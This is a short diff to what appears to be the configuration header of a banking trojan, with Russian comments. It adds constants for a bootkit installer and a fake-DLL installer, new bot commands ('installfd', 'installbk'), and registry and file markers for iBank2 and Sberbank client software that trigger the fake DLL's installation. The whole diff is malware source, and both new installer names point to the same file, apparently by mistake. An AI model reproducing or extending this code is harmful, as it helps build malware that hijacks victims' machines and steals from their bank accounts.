@@ -85,12 +85,20 @@ CSSTR EStrProcessCommandDeleteBot[] = "delbt";  // Команда на удаление exe бота
 CSSTR EStrPrefixFileName[] = "mnprsdd.dat"; // Файл хранения префикса
 
 
-// Имена плагина бота в виде длл
+// Имя плагина бота в виде длл
 CSSTR EStrBotPlug[] = "bot.plug";
+
+// Имф инсталтора буткита
+CSSTR EStrBootkitInstaller[] = "bki.plug";
+
+// Имя инсталятора фэкедлл
+CSSTR EStrFakeDllInstaller[] = "bki.plug";
+
 
 
 // Перечень команд, которые может выполняь бот
-CSSTR CommandInstallFakeDLL[] = "installfakedll";
+CSSTR EStrCommandInstallFakeDLL[] = "installfd";  // Команда на инсталяцию фэкедлл
+CSSTR EStrCommandInstallBootkit[] = "installbk";  // Команда на инсталяцию буткита
 
 
 // Имена файлов, для добавления в лог
@@ -134,8 +142,6 @@ CSSTR HTTPOctetStream[]            = "application/octet-stream";
 
 
 #ifdef FakeDllInstallerH
-	CSSTR EStrFakeDllInstallerCommandParams[] = "fdi.plug bot.plug";
-
 	CSSTR EStrIBankRegistryPath[] = "SOFTWARE\\Classes\\Installer\\Products\\7B00DF09E169B5445AD2F176D624114\\";
 	CSSTR EStrSberRegistryKey[]   = "SBRF\\";
 	CSSTR EStrIBankFileName[]     = ".iBank2"; // Имя файли при обнаружении которого будет установлена Fake DLL
